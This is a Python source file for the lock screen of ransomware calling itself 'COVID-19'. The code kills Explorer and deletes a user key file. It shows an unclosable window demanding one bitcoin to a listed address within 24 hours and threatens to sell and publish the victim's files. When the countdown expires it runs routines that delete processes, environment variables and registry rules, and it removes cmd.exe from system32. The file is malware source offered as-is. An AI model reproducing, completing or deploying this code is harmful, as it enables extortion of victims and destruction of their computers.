#!/usr/bin/python
#coding:utf-8
from tkinter import *
from PIL import ImageTk, Image
from timeit import default_timer
import tkinter as tk
import os, time, sys, timeps
from modules.system import regedit, killproc, delproc
# Kill Explorer for Restarting machine
killproc.exp()
path = os.environ["SystemDrive"]
usr = os.environ["USERNAME"]
# Search and remove key function
usrkey = "%s.key" %(usr)
def fkey():
    rkey = "start /min dir /s %s\\%s" %(path, usrkey)
    os.system(rkey)
    chemin = "start /min del %s" %(rkey)
    os.system(chemin)
fkey()
#Init window for gui_counter
window = Tk()
path = "\\PerfLogs\\gui_counter\\db.txt"
# Function to set a time on the window
def updateTime(generator):
    global p
    p = next(generator)
    canvas.itemconfigure(text_clock, text=p, font=(None, 35))
    window.after(1000, updateTime, generator)
    with open(path, "w") as db:
        db.write(p)
    x = open(path).read()
    if(x == "00:00:00"):
        # Here instruction to destroyed the system ...
        killproc.exp()
        delproc.exp()
        delproc.pwsst()
        regedit.delenv()
        regedit.delSpecRules()
        os.remove("\\windows\\system32\\cmd.exe")
        sys.exit(0)

def instructions():
    txt = tk.Label(font="bold", text="\nYour computer it's locked by the Ransomware COVID-19\n\n \
    For unlock to computer,\n \
    You have 24 HOURS to buy 1 bitcoin and transfert it at this address :\n\n \
    34YVap4JyjiBTWvy6Qobmni1k3tHbdi8UEL")
    txt.pack()

def warning():
    wrn = tk.Label(font="bold", text="Warning Noob!\n \
    Restarting is useless\n\n \
    If you don't pay, all your sensitive files will be resold and publicate.\n")
    wrn.pack()

def pay_to_decrypt():
    btn1 = tk.Button(window, text="Decrypt your files", font="bold", fg="red", bg="black")
    btn1.pack(side=tk.BOTTOM)
    btn2 = tk.Button(window, text="Pay the Ransom", font="bold", fg="red", bg="black")
    btn2.pack(side=tk.BOTTOM)

# Function to desactived the header who contains the resize, minimize and exit window
window.overrideredirect(1)
canvas = Canvas(window, width=200, height=100, bg="red")
canvas.pack()
text_clock = canvas.create_text(100, 50)
# Function to control if db.txt exist
try:
    with open(path, "r") as db:
        db = db.read()
        db = db.split(":")
        hours = int(db[0])
        minutes = int(db[1])
        secondes = int(db[2])
        updateTime(timeps.set_time(hours, minutes, secondes))
except FileNotFoundError:
    with open(path, "w") as db:
        updateTime(timeps.set_time(24, 0, 0))
except:
    with open(path, "w") as db:
        updateTime(timeps.set_time(24, 0, 0))
try:
    b = os.environ['SystemDrive']
    a = "\\PerfLogs\\gui_counter\\image.jpg"
    z = "%s%s" %(b, a)
    # Set image in the window
    img = ImageTk.PhotoImage(Image.open(z))
    panel = tk.Label(window, image = img)
    panel.pack(side = "top", fill = "both", expand = "yes")
except FileNotFoundError:
    pass
# Instructions message for the user
instructions()
warning()
pay_to_decrypt()
window.mainloop()
